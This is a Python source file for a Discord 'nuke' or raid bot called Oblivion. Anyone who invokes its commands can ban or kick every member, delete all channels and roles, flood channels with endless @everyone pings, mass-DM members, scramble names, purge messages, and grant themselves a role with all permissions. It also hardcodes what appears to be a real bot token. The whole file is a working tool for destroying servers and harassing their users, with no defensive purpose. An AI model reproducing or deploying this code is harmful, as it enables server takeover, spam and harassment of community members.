import discord
from discord.ext import commands
from discord import Permissions
import string
import random

client = commands.Bot(command_prefix = '-O.')



TOKEN = 'NjkzOTIzMDg4NzYwNDM4ODM0.XoFwxg.YjWVR0JbfZhdcWzdfojFmLJ7SlA'

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.dnd, activity=discord.Game('Awaiting FEMA Orders'))
    print(f'\nLogged in as {client.user.name}#{client.user.discriminator}, User ID: {client.user.id}, Version: {discord.__version__}\n')
    print('Oblivion is now online. Awaiting FEMA Orders\nOnly FEMA Director can Activate Systems V9-15\nPending Director Authorization\n\n')

@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')
    print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]ping - successful')

@client.command()
async def banAll(ctx):
    await ctx.message.delete()
    await ctx.send('Banning all members!')
    for member in ctx.guild.members:
        try:
            await member.ban()
            print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]banAll - successful')
        except:
            continue

@client.command()
async def kickAll(ctx):
    await ctx.message.delete()
    await ctx.send('Kicking all members!')
    for member in ctx.guild.members:
        try:
            await member.kick()
            print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]kickAll - successful')
        except:
            continue

@client.command()
async def role(ctx, choice):
    if choice == 'create':
        print('Spam creating roles...')
        for i in range(1, 31):
            await ctx.guild.create_role(name=f'Spam Role {i}')
        await ctx.send('Done creating 60 spam roles...')
        print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]role create - successful')
    elif choice == 'delete':
        print('Deleting all roles...')
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                await role.delete()
        await ctx.send('Done deleting spam roles...')
        print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]role delete - successful')
    else:
        await ctx.send('not valid option')
        print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]role create/delete - user did not specify option')

@client.command()
async def channel(ctx, choice):
    if choice == 'create':
        for i in range(1, 31):
            await ctx.guild.create_voice_channel(f'Spam-Voice-Channel {i}')
            await ctx.guild.create_text_channel(f'Spam-Text-Channel {i}')
        await ctx.send('Done, I created 60 spam channels')
        print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]channel create - successful')
    elif choice == 'delete':
        for channel in ctx.guild.channels:
            await channel.delete()
        await ctx.guild.create_text_channel('general')
        await ctx.send('Finsihed deleting all channels')
        print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]channel delete - successful')
    else:
        await ctx.send('not valid option')
        print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]channel delete/create - user did not specify option')

@client.command()
async def spam(ctx, choice): 
        if choice == 'start':
            print ('Sending spam messages...')
            while 1 == 1:
                await ctx.send('@everyone')
        elif choice == 'stop':
            for channel in ctx.guild.channels:
                await channel.delete()
            await ctx.guild.create_text_channel('general')
            await ctx.send('Stopped Spamming...')
        else:
            await ctx.send ('Failed')

@client.command()
async def massDM(ctx, *, msg = None):
    await ctx.message.delete()
    if msg != None:
        for member in ctx.guild.members:
            try:
                if member.dm_channel != None:
                    await member.dm_channel.send(msg)
                    print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]massDM - successful')
                else:
                    await member.create_dm()
                    await member.dm_channel.send(msg)
                    print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]massDM - successful')
            except:
                continue
    else:
        await ctx.send('What do you want to DM?')
        print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]massDM - did not specify message')

@client.command()
async def nickAll(ctx):
    await ctx.message.delete()
    char = string.ascii_letters + string.digits
    for member in ctx.guild.members:
        nickname = ''.join((random.choice(char) for i in range(16)))
        try:
            await member.edit(nick=nickname)
            print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]nickAll - successful')
        except:
            continue

@client.command()
async def channelNick(ctx):
    await ctx.message.delete()
    char = string.ascii_letters + string.digits
    for channel in ctx.guild.channels:
        channelName = ''.join((random.choice(char) for i in range(16)))
        await channel.edit(name=channelName)
    print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]channelNick - succesful')

@client.command()
async def purge(ctx):
    for tc in ctx.guild.text_channels:
        while tc.last_message != None:
            await tc.purge(bulk=True)
            print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]purge - successful')

@client.command()
async def admin(ctx):
    await ctx.message.delete()
    await ctx.guild.create_role(name='SWAT', permissions=Permissions.all())
    role = discord.utils.get(ctx.guild.roles, name="SWAT")
    await ctx.author.add_roles(role)
    await ctx.send('Given SWAT')
    print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]admin - successful')

@client.command()
async def logout(ctx):
    await ctx.message.delete()
    if ctx.author.id == 1234567890: #insert your User ID here, as an integer
        await ctx.send('logging out')
        print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]logout - sucessful')
        await client.logout()
    else:
        await ctx.send('you do not have the required permissions to perform this action')
        print (f'[[{ctx.message.guild}]]by[[{ctx.message.author}]]logout - user did not have required perissions')

client.run(TOKEN)